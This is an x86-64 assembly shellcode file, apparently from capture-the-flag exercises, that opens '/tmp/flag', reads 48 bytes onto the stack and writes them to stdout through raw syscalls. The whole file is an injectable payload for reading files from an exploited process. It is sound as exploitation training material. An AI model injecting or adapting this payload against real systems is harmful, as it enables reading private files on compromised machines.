; Name: orw.S

; open syscall, filepath = "/tmp/flag"

push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp	; rdi = "/tmp/flag"
xor rsi, rsi	; RD_ONLY
xor rdx, rdx	; rdx = 0
mov rax, 2	; syscall_open
syscall		; open("/tmp/flag", RD_ONLY, NULL)

; read syscall, fd is pre-allocted at 'rax' after syscall_open
mov rdi, rax	; rdi = fd
mov rsi, rsp
sub rsi, 0x30	; rsi = rsp - 0x30	; buf (above current stack)
mov rdx, 0x30	; rdx = 0x30		; len
mov rax, 0x0	; rax = 0		; syscall_read
syscall		; read(fd, buf, 0x30)

; write syscall
mov rdi, 1	; rdi = 1	; fd = stdout
mov rax, 0x1	; rax = 1	; syscall_write
syscall		; write(fd, buf, 0x30)
